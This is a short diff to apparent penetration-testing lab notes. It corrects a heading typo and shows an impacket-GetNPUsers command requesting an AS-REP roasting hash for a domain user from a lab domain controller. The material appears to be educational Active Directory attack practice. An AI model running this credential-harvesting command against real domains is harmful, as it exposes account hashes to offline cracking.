@@ -52,7 +52,7 @@ UserPrincipalName     : mmorgan@inlanefreight.local
 PS C:\Tools>
 ```
 
-#### impacet-GetNPUsers:
+#### impacket-GetNPUsers:
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ impacket-GetNPUsers INLANEFREIGHT.LOCAL/mmorgan -format hashcat -dc-ip 172.16.5.5 -no-pass
